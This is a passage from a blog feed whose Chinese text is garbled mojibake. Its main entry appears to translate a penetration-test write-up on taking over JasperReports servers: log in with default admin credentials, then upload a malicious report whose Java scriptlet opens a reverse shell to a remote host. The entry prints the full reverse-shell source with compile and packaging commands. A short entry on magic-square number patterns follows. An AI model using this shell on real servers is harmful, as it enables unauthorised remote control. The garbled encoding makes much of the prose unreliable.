class="string">"4"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"0a1206b8-d0d6-4809-a424-3d7f09606b44"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Address"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"7bc63c7e-0224-441b-96ec-8a1bb67a0b84"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">componentElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jasperReport</span>&gt;</span></span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥çœ‹42è¡Œï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªgetshellçš„æ–¹æ³•åœ¨ShellScriptlet_SCRIPTLETã€‚åœ¨35è¡Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªShellScriptlet_SCRIPTLET æ¥å¼•ç”¨â€œfoxglove.shell.ShellScriptletâ€ä¸­çš„Javaä»£ç ã€‚</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">è¿™å¾ˆç®€å•,ä½†è¿™åœ¨Javaä»£ç æœ¬èº«æ˜¯å¦‚ä½•å®šä¹‰çš„å‘¢?</span><br><span class="line"></span><br><span class="line">ç¼–å†™æ”»å‡»è„šæœ¬</span><br><span class="line"></span><br><span class="line">scriptletç”¨Javaç¼–å†™,éœ€è¦å»æ‰©å±•â€œJRDefaultScriptletâ€ã€‚æˆ‘ä»<span class="string">"here"</span>ä¸­å€Ÿç”¨äº†ä¸€äº›Javaä»£ç æ¥åå¼¹shellå¹¶ä¸”è®©è¿™ç§æ”»å‡»è„šæœ¬æˆä¸ºè·¨å¹³å°çš„ã€‚ä¸‹é¢å°±æ˜¯ç»“æœäº†ï¼Œè¦æ³¨æ„â€œhostâ€å’Œâ€œportâ€çš„å†™æ³•æ˜¯å›ºå®šçš„ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> foxglove.shell;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRDefaultScriptlet;</span><br><span class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRScriptletException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellScriptlet</span> <span class="keyword">extends</span> <span class="title">JRDefaultScriptlet</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">   Socket socket;</span><br><span class="line"> </span><br><span class="line">   PrintWriter socketWrite;</span><br><span class="line">   BufferedReader socketRead;</span><br><span class="line"> </span><br><span class="line">   PrintWriter commandWrite;</span><br><span class="line">   BufferedReader commandRead;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">static</span> String ip;</span><br><span class="line">   <span class="keyword">int</span> port = <span class="number">8080</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getShell</span><span class="params">()</span></span>&#123;</span><br><span class="line">      ip = <span class="string">"1.1.1.1"</span>;</span><br><span class="line">      ShellScriptlet shell = <span class="keyword">new</span> ShellScriptlet();</span><br><span class="line">      shell.establishConnection();</span><br><span class="line">      <span class="keyword">new</span> Thread(shell).start();</span><br><span class="line">      shell.getCommand();</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"DONE"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">      spawnShell();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spawnShell</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">boolean</span> windows = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">            windows = <span class="keyword">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Runtime rt = Runtime.getRuntime();</span><br><span class="line">         Process p;</span><br><span class="line">         <span class="keyword">if</span>(windows) p = rt.exec(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>);</span><br><span class="line">         <span class="keyword">else</span> p = rt.exec(<span class="string">"/bin/sh"</span>);</span><br><span class="line"> </span><br><span class="line">         InputStream readme = p.getInputStream();</span><br><span class="line">         OutputStream writeme = p.getOutputStream();</span><br><span class="line">         commandWrite = <span class="keyword">new</span> PrintWriter(writeme);</span><br><span class="line">         commandRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(readme));</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span>(windows) commandWrite.println(<span class="string">"dir"</span>);</span><br><span class="line">         <span class="keyword">else</span> commandWrite.println(<span class="string">"ls -al"</span>);</span><br><span class="line"> </span><br><span class="line">         commandWrite.flush();</span><br><span class="line"> </span><br><span class="line">         String line;</span><br><span class="line">         <span class="keyword">while</span>((line = commandRead.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            socketWrite.println(line);</span><br><span class="line">            socketWrite.flush();</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         p.destroy();</span><br><span class="line"> </span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">establishConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">         socket = <span class="keyword">new</span> Socket(ip,port);</span><br><span class="line">         socketWrite = <span class="keyword">new</span> PrintWriter(socket.getOutputStream(),<span class="keyword">true</span>);</span><br><span class="line">         socketRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</span><br><span class="line">         socketWrite.println(<span class="string">"---Connection has been established---"</span>);</span><br><span class="line">         socketWrite.flush();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCommand</span><span class="params">()</span></span>&#123;</span><br><span class="line">      String foo;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="keyword">while</span>((foo=socketRead.readLine())!= <span class="keyword">null</span>)&#123;</span><br><span class="line">            commandWrite.println(foo);</span><br><span class="line">            commandWrite.flush();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      ShellScriptlet r = <span class="keyword">new</span> ShellScriptlet();</span><br><span class="line">      r.getShell();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºé‚£äº›ä¸ç†Ÿæ‚‰Javaçš„,ä½ å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘åœ¨ç›¸åŒçš„ç›®å½•ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŒ‡å®šâ€ javac â€œçš„å®Œæ•´è·¯å¾„æ˜¯æœ‰åŸå› çš„(è¿™æ˜¯Java 1.6)ã€‚å¦‚æœä½ è¿è¡Œè¿™ä¸ªå‘½ä»¤å¯¹æŸç§ç³»ç»Ÿä¼šå‡ºé”™,ä½ éœ€è¦è€ƒè™‘ç†æƒ³æƒ…å†µä¸‹ç”¨ç›¸åŒçš„ç¯å¢ƒæ¥ç¼–è¯‘å®ƒï¼Œè‡³å°‘ä¸æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠæ‰€æœ‰çš„ä»£ç æ‰“åŒ…è¶æœ‰ä¸ªjaræ–‡ä»¶ç„¶åä¸Šä¼ åˆ°ç›®æ ‡ç«™ç‚¹ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ªä»£ç æ¥å®Œæˆå®ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€åˆ‡è¿›è¡Œçš„é¡ºåˆ©ï¼Œä½ å°±ä¼šå¾—åˆ°ä¸ªâ€œshell.jarâ€æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±å‡†å¤‡ä¸Šä¼ è¿™ä¸ªåˆ°ç›®æ ‡ç«™ç‚¹å§ï¼</p><h4 id="éƒ¨ç½²è¿™ä¸ªæ–°çš„â€œReportâ€"><a href="#éƒ¨ç½²è¿™ä¸ªæ–°çš„â€œReportâ€" class="headerlink" title="éƒ¨ç½²è¿™ä¸ªæ–°çš„â€œReportâ€"></a>éƒ¨ç½²è¿™ä¸ªæ–°çš„â€œReportâ€</h4><p>æ¯ä¸ªç‰ˆæœ¬çš„JasperReportsä¼¼ä¹éƒ½æœ‰äº›ä¸åŒï¼Œä½†æ˜¯ä»–ä»¬éƒ½æœ‰ç›¸åŒçš„å‡½æ•°å’Œå·¥ä½œæµã€‚</p><p>é¦–å…ˆå¾ˆæ˜æ˜¾æˆ‘ä»¬è¦å»éªŒè¯ä¸€ä¸‹â€œjasperadmin/jasperadminâ€ï¼š<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/authd.png?w=960" alt="authd.png"></p><p>åœ¨æˆ‘è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œè¿™å°±ç«‹å³æ˜¾ç¤ºå‡ºäº†æœ‰ä¸€å †reportsæ ·ä¾‹çš„â€œRepositoryâ€ï¼ˆè¦ç¡®ä¿â€œTypeâ€è¿™ä¸€åˆ—è¯´çš„æ˜¯â€œReportâ€ï¼‰ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åªè¦å³å‡»ä¸€ä¸ªreportå¹¶ä¸”ç‚¹å‡»â€œEditâ€å°±å¥½ã€‚</p><p>ä¸€å¼€å§‹ï¼Œå°±ç‚¹å‡» â€œControls and Resourcesâ€ ä¹‹åç‚¹å‡»â€œAdd Resourceâ€ã€‚ä¸Šä¼ æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„JARæ–‡ä»¶å¹¶ç»™è¿™ä¸ªèµ„æºå‘½åä¸ºâ€œShellScriptletâ€ã€‚ç»“æŸä¹‹åæˆ‘ä»¬åº”è¯¥å¯ä»¥çœ‹åˆ°ä¸‹å›¾è¿™æ ·çš„ç»“æœï¼š<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resource.png?w=960" alt="resource.png"></p><p>ç‚¹å‡»å·¦ä¾§æ çš„â€œSet Upâ€ï¼Œå•å‡» â€œUpload a Local fileâ€æŠŠæˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„JRXMLæ–‡ä»¶ä¸Šä¼ äº†ã€‚ä½ åº”è¯¥å¯ä»¥å¾—åˆ°ä¸‹å›¾æ‰€ç¤ºçš„ç»“æœï¼š<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resources2.png?w=960" alt="resources2"></p><p>Jasper ç°åœ¨è®©æˆ‘ä»¬å»å®šä¹‰ä¸€äº›æˆ‘ä»¬åœ¨JRXMLæ–‡ä»¶å¼•ç”¨çš„èµ„æºã€‚å¦‚æœä½ æ˜¯ä¸€ä¸ªkeenerä½ å¯èƒ½ä¼šä»…ä»…æŠŠè¿™äº›èµ„æºä»JRXMLæ–‡ä»¶ä¸­åˆ é™¤ã€‚ä»…ä»…å•å‡»â€œAdd Nowâ€å¹¶ä¸”ä¸Šä¼ ä¸€äº›éšæœºçš„PNGå›¾ç‰‡æ–‡ä»¶ä¸ºä½ æ¯ä¸€ä¸ªå¼•ç”¨èµ„æºâ€¦å½“ä½ åšå®Œè¿™äº›åº”è¯¥çœ‹èµ·æ¥åƒä¸‹å›¾ä¸€æ ·ï¼š<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resourcesadded.png?w=960" alt="resourcesadded"></p><p>ç°åœ¨ä½ åªéœ€è¦ç‚¹å‡»â€œSubmitâ€åœ¨è¿™ä¸ªæŒ‰é’®æ¥åˆ›å»ºæˆ‘ä»¬çš„æ¶æ„reportå°±å¥½äº†ã€‚å“ˆå“ˆ</p><h4 id="Shellz"><a href="#Shellz" class="headerlink" title="Shellz!"></a>Shellz!</h4><p>å…ˆåˆ«æ¿€åŠ¨ï¼Œåœ¨ä½ è¿è¡Œè¿™ä¸ªreportä¹‹å‰ï¼Œä½ è¿˜è¦å¼€ä¸ªç›‘å¬ç«¯å£å»æ•æ‰ä½ çš„shellï¼ï¼ï¼<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/listener.png?w=960" alt="listener.png"></p><p>ä¹‹åå•å‡»ä½ åˆ›å»ºçš„reportï¼Œå®ƒå°†ä¼šè¿è¡ŒJavaä»£ç ï¼Œå¦‚æœæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½ å°±å¯ä»¥çœ‹åˆ°åå¼¹çš„shelläº†ã€‚</p><p><img src="https://foxglovesecurity.files.wordpress.com/2016/10/shell1.png?w=960" alt="shell"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸ä¹…å‰ï¼Œæˆ‘çš„åŒäº‹è·Ÿæˆ‘åœ¨å¯¹ä¸€ä¸ªå®¢æˆ·ç«¯è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚æˆ‘ä»¬ç¡®å®å‘ç°çš„ä¸€ä»¶äº‹æ˜¯,ä»–ä»¬ç•™ä¸‹äº†å‡ ä¸ªè”ç½‘çš„JasperReportsæœåŠ¡å™¨ã€‚å¯»æ‰¾é»˜è®¤ç®¡ç†å¸æˆ·çš„ç”¨æˆ·åå¹¶æ²¡æœ‰èŠ±è´¹å¤ªå¤šçš„ç²¾åŠ›ã€‚&lt;br&gt;&lt;img src=&quot;https://foxglovesecurity.files.wordpr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>æ´›ä¹¦ä¸­çš„æ•°å­—è§„å¾‹</title>
    <link href="http://zer0yu.github.io/2017/01/22/%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B/"/>
    <id>http://zer0yu.github.io/2017/01/22/æ´›ä¹¦ä¸­çš„æ•°å­—è§„å¾‹/</id>
    <published>2017-01-22T02:57:34.000Z</published>
    <updated>2017-01-22T02:58:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png" alt="1"></p><h2 id="æ•°å­—è§„å¾‹"><a href="#æ•°å­—è§„å¾‹" class="headerlink" title="æ•°å­—è§„å¾‹"></a>æ•°å­—è§„å¾‹</h2><p><a href="undefined">ç¼–è¾‘</a></p><p>é‚£ä¹ˆ<a href="http://baike.baidu.com/view/102528.htm" target="_blank" rel="noopener">æ²³å›¾æ´›ä¹¦</a>ä¸­çœŸçš„éšå«ç€å®‡å®™ä¹‹ç†å—ï¼Ÿå…¶å†…å®¹åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘åœ¨è¿™é‡Œåªèƒ½å…ˆè°ˆæ´›ä¹¦ï¼Œå³<a href="http://baike.baidu.com/view/97444.htm" target="_blank" rel="noopener">ä¹å®«å›¾</a>ã€‚æŠŠä¹å®«å›¾ä¸­çš„æ•°å­—æ’åˆ—æ¥è¿›è¡Œè¯¦è§£ä¸€ç•ªï¼Œæˆ–å¯çœ‹å‡ºä¸€å®šé“ç†æ¥ã€‚é¦–å…ˆåœ¨ä¹å®«å›¾ä¸­æ•°å­—ä¹‹å’Œç­‰äºåäº”ï¼Œè¿™ä¸€ç‚¹ææ€•æ‰€æœ‰çš„äººéƒ½çŸ¥é“ï¼Œå°±æ˜¯æ¨ªåšæ–œç›¸åŠ éƒ½ç­‰äºåäº”ã€‚</p><p>4+9+2=15</p><p>3+5+7=15</p><p>8+1+6=15</p><p>4+3+8=15</p><p>9+5+1=15</p><p>2+7+6=15</p><p>4+5+6=15</p><p>2+5+8=15</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä»€ä¹ˆæ•°å­—ç„æœºå‘¢ï¼Ÿ</p><p>a+b+c=d+e+f</p><p>a^2+b^2+c^2=d^2+e^2+f^2</p><p>æˆ‘ä»¬ä»¥å·¦åˆ—çš„438ä¸å³åˆ—çš„276ä¸ºä¾‹åŠ ä»¥è¯´æ˜ã€‚å½“æˆ‘ä»¬æŠŠæ•°é€’å˜ä¸ºä¸¤ä½æ•°ç›¸åŠ æ—¶ï¼Œå·¦å³ä¸¤åˆ—æ•°å­—ä¹‹å’Œä¾ç„¶ç›¸ç­‰ã€‚å³43+38+84=27+76+62ã€‚ä»ä¸‹å‘ä¸Šé€’å˜ä¾ç„¶æˆç«‹ã€‚å³83+34+48=67+72+26ã€‚</p><p>é€’å˜ä¸ºä¸‰ä½æ•°ä¾ç„¶ç›¸ç­‰ï¼Œå³438+384+843=276+762+627ã€‚</p><p>ä»ä¸‹å‘ä¸Šé€’æ•°ä¾ç„¶æˆç«‹ï¼Œå³834+348+483=672+726+267ã€‚</p><p>å†è¿™æ ·é€’å˜ä¸‹å»ä¸ºå››ä½æ•°ã€äº”ä½æ•°ã€å…­ä½æ•°ï¼Œä¸€ç™¾ä½æ•°ã€ä¸€åƒä½æ•°ä¾ç„¶æˆç«‹ã€‚ç¥å¥‡ä¹‹å¤„è¿˜ä¸åœ¨è¿™é‡Œï¼Œæ›´ä¸ºç¥å¥‡çš„æ˜¯ä¸ç®¡æ˜¯ä¸€ä½ï¼Œè¿˜æ˜¯ä¸¤ä½æ•°ä¸‰ä½æ•°çš„å¹³æ–¹ç›¸åŠ å’Œä¾ç„¶å¯ä»¥å·¦å³ç›¸ç­‰ã€‚æ¯”å¦‚ä¸¤ä½æ•°å³43^2+38^2+84^2=27^2+76^2+62^2ã€‚</p><p>ä¸‰ä½æ•°å››ä½æ•°å¹³æ–¹å’Œä¾ç„¶å¯ä»¥æˆç«‹ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€ç™¾ä½ä¹Ÿå¥½ä¸€åƒä½ä¹Ÿå¥½éƒ½å¯ä»¥æˆç«‹ã€‚è¿™ä¸ªæ•°å­—çš„ç¥å¥‡æ’åˆ—çœŸæ˜¯è®©æˆ‘è«åæƒŠè¯§ã€‚</p><p>å†æœ‰å°±æ˜¯æŠŠä¹å®«å›¾ç”¨è¡Œåˆ—å¼çš„æ–¹æ³•è®¡ç®—ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªå‘¨å¤©æ•°360ã€‚åœ¨è¿™äº›æ•°å­—é¢å‰ï¼Œæˆ‘ä¸æ•¢æƒ³è±¡ï¼Œè¿™æ ·ä¸€ä¸ªæ•°å­—æ’ç«Ÿç„¶æœ‰ç€ä¸å¯æ€è®®çš„é­”åŠ›ã€‚</p><p>det[4 ï¼Œ9ï¼Œ 2ï¼›3ï¼Œ5ï¼Œ7ï¼›8ï¼Œ1ï¼Œ6]=360</p><p>å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªä¹å®«æ•°çš„æ’åˆ—è§£å¼€äº†ç¾å›½æ•°å­¦å®¶æå‡ºçš„æ•°å­¦æ€ªé¢˜ï¼Œä¸¥æ ¼ç­‰å¹³æ–¹å’Œçš„é—®é¢˜ï¼Œå½“æ—¶å¯æ˜¯æ— äººèƒ½è§£çš„æ•°å­¦æ€ªé¢˜ï¼Œå°±è¿è®¡ç®—æœºéƒ½æ— èƒ½ä¸ºåŠ›ã€‚ç»“æœè¢«ç ”ç©¶æ´›ä¹¦çš„å½­ç»å®šæ•°å­¦æ•™æˆæ”»å…‹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;æ•°å­—è§„å¾‹&quot;&gt;&lt;a href=&quot;#æ•°å­—è§„å¾‹&quot; class=&quot;headerlink&quot; title=&quot;æ•°å­—è§„å¾‹&quot;&gt;&lt;/a&gt;æ•°
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Brainfuck</title>
    <link href="http://zer0yu.github.io/2017/01/22/Brainfuck/"/>
    <id>http://zer0yu.github.io/2017/01/22/Brainfuck/</id>
    <published>2017-01-22T02:50:39.000Z</published>
    <updated>2017-01-22T02:53:40.000Z</updated>
    
